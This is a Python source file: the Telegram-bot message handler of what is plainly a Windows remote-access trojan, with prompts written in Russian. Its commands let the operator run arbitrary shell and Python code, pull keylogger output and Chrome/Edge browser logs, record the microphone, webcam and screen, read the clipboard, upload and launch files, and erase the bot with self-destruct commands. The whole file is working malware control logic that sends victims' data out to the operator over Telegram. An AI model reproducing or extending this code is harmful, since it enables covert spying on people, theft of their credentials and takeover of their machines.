import logging
from commands import *
from aiogram import Bot
import asyncio
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.types import Message, FSInputFile, CallbackQuery
from aiogram.fsm.context import FSMContext
from states import *
from state_handlers import handle_states
from utils import send_safe_message, send_safe_document, send_file_and_cleanup


def build_keyboard(page_number=0):
    keyboard_buttons = []
    for text, callback in HOTKEY_PAGES[page_number]:
        keyboard_buttons.append([InlineKeyboardButton(text=text, callback_data=callback)])
    return InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)


async def handle_hotkey_callback(callback: CallbackQuery, bot: Bot):
    data = callback.data

    if data.startswith("page_"):
        page_number = int(data.split("_")[1])
        await callback.message.edit_text(
            "🖥️ <b>Горячие клавиши Windows</b>\n\n"
            "Нажмите на нужную комбинацию для выполнения:",
            reply_markup=build_keyboard(page_number),
            parse_mode="HTML"
        )
        await callback.answer()
        return

    try:
        result = execute_hotkey(data)
        await callback.answer(result, show_alert=False)
        await callback.message.edit_text(
            f"🖥️ <b>Горячие клавиши Windows</b>\n\n"
            f"✅ Выполнено: <code>{data}</code>\n\n"
            f"Нажмите на другую комбинацию для выполнения:",
            reply_markup=build_keyboard(0),
            parse_mode="HTML"
        )
    except Exception as e:
        await callback.answer(f"❌ Ошибка: {e}", show_alert=True)


async def handle_message(message: Message, bot: Bot, state: FSMContext):
    chat_id = message.chat.id
    if not checkchat_id(chat_id):
        return

    # Проверяем состояние перед обработкой файлов
    current_state = await state.get_state()

    # Обработка документов
    if message.document:
        try:
            if current_state == DownloadFile.waiting_for_file.state:
                file_id = message.document.file_id
                file_name = message.document.file_name
                save_path = os.path.join(SCRIPTS_DIR, file_name)
                file = await bot.get_file(file_id)
                await bot.download_file(file.file_path, save_path)
                await bot.send_message(chat_id, f"✅ Файл {file_name} успешно сохранён в {save_path}")
                await state.clear()
                return

            file_id = message.document.file_id
            file_name = message.document.file_name
            save_path = os.path.join(SCRIPTS_DIR, file_name)
            file = await bot.get_file(file_id)
            await bot.download_file(file.file_path, save_path)
            await bot.send_message(chat_id, f"Файл {file_name} успешно сохранён!")
        except Exception as e:
            logging.error(f"Ошибка скачивания файла: {e}")
            await bot.send_message(chat_id, f"Ошибка: {e}")
        return

    # Обработка фото
    if message.photo:
        try:
            if current_state == ClickImage.waiting_for_photo.state:
                photo = message.photo[-1]
                file_id = photo.file_id
                save_path = os.path.join(SCRIPTS_DIR, 'CLICK.png')
                file = await bot.get_file(file_id)
                await bot.download_file(file.file_path, save_path)
                result = click_image()
                await bot.send_message(chat_id, result)
                await state.clear()
                return
        except Exception as e:
            logging.error(f"Ошибка скачивания фото: {e}")
            await bot.send_message(chat_id, f"❌ Ошибка сохранения фото: {e}")
        return

    if not message.text:
        return

    command = message.text.strip()
    response = ''

    # Обработка состояний
    state_handled = await handle_states(message, bot, state, command)
    if state_handled:
        return

    # Обычные команды
    try:
        if command == '/start':
            response = get_start_message()

        elif command == '/click_image':
            await state.set_state(ClickImage.waiting_for_photo)
            response = '🖼️ Отправьте фото с изображением, на которое нужно кликнуть:'

        elif command == '/ping':
            response = ping()

        elif command == '/pc_info':
            response = get_pc_info()

        elif command == '/clipboard_get':
            response = get_clipboard_text()

        elif command == '/mic_record':
            await state.set_state(MicRecord.waiting_for_seconds)
            response = 'На сколько секунд записать звук? (макс 300):'

        elif command == '/processes':
            response = get_processes()

        elif command == '/kill':
            await state.set_state(KillProcess.waiting_for_pid)
            response = 'Введите PID процесса, который нужно завершить:'

        elif command == '/beep':
            response = beep_sound()

        elif command == '/drives':
            response = get_drives()

        elif command == '/close_tabs':
            response = close_all_tabs()

        elif command == '/hot_keys':
            await bot.send_message(
                chat_id,
                "🖥️ <b>Горячие клавиши Windows</b>\n\n"
                "Нажмите на нужную комбинацию для выполнения:",
                reply_markup=build_keyboard(0),
                parse_mode="HTML"
            )
            return

        elif command == '/ip_info':
            info = get_ip_info()
            await bot.send_location(chat_id, *info['location'])
            response = info['text']

        elif command == '/cmd_exec':
            await state.set_state(CmdExec.waiting_for_command)
            response = '💻 Введите команду для выполнения:'

        elif command == '/python_exec':
            await state.set_state(PythonExec.waiting_for_code)
            response = '🐍 Введите Python код для выполнения:'

        elif command == '/capture_pc':
            path, response = capture_pc()
            await send_file_and_cleanup(bot, chat_id, path)
            response = None

        elif command == '/video_pc':
            await state.set_state(VideoPc.waiting_for_seconds)
            response = '🎥 На сколько секунд записать видео? (макс 500):'

        elif command == '/capture_webcam':
            path = capture_webcam()
            if path:
                await send_file_and_cleanup(bot, chat_id, path)
            else:
                response = '❌ Ошибка захвата с камеры'

        elif command == '/msg_box':
            await state.set_state(MsgBox.waiting_for_text)
            response = '💬 Введите текст сообщения:'

        elif command == '/message_write':
            await state.set_state(MessageWrite.waiting_for_text)
            response = '✏️ Введите текст для ввода:'

        elif command == '/move_mouse_coord':
            await state.set_state(MoveMouseCoord.waiting_for_coords)
            response = '🎯 Введите координаты x y (например: 500 300):'

        elif command == '/move_mouse':
            await state.set_state(MoveMouseDirection.waiting_for_direction)
            response = '🧭 Введите направление (левее/правее/выше/ниже):'

        elif command == '/click_left_mouse':
            response = click_left_mouse()

        elif command == '/click_right_mouse':
            response = click_right_mouse()

        elif command == '/double_click':
            response = double_click_left()

        elif command == '/download':
            await state.set_state(Download.waiting_for_path)
            response = '📥 Введите путь к файлу на компьютере:'

        elif command == '/clipboard_set':
            await state.set_state(ClipboardSet.waiting_for_text)
            response = '📋 Введите текст, который нужно скопировать в буфер обмена:'

        elif command == '/download_file':
            await state.set_state(DownloadFile.waiting_for_file)
            response = '📁 Отправьте файл, который хотите сохранить на компьютере:'

        elif command == '/run':
            await state.set_state(Run.waiting_for_path)
            response = '🚀 Введите путь к файлу для запуска:'

        elif command == '/wallpaper':
            await state.set_state(Wallpaper.waiting_for_path)
            response = '🖼️ Введите путь к файлу или URL картинки:'

        elif command == '/ls':
            await state.set_state(Ls.waiting_for_path)
            response = '📁 Введите путь к папке (Enter - текущая):'

        elif command == '/open_browser':
            await state.set_state(OpenBrowser.waiting_for_url)
            response = '🌐 Введите URL:'

        elif command == '/shutdown':
            response = shutdown()

        elif command == '/reboot':
            response = reboot()

        elif command == '/keylogs':
            await send_safe_document(bot, chat_id, KEYLOG_FILE)
            get_keylog_file()
            response = None

        elif command == '/user_log':
            await send_safe_document(bot, chat_id, LOG_FILE)
            get_user_log_file()
            response = None

        elif command == '/chrome_log':
            result = get_browser_log(browser='chrome')
            if result and os.path.exists(result):
                await send_safe_document(bot, chat_id, result)
                os.remove(result)
            else:
                response = result

        elif command == '/edge_log':
            result = get_browser_log(browser='edge')
            if result and os.path.exists(result):
                await send_safe_document(bot, chat_id, result)
                os.remove(result)
            else:
                response = result

        elif command == '/self_destruct':
            response = confirm_self_destruct()

        elif command == '/destroy':
            response = remove_bot()
            await send_safe_message(bot, chat_id, response)
            await asyncio.sleep(1)
            os._exit(0)

        elif command == '/create_more_folders':
            await state.set_state(CreateMoreFolders.waiting_for_count)
            response = '📂 Введите количество папок:'

    except Exception as e:
        response = f'⚠️ Ошибка: {e}'

    if response:
        await send_safe_message(bot, chat_id, response)



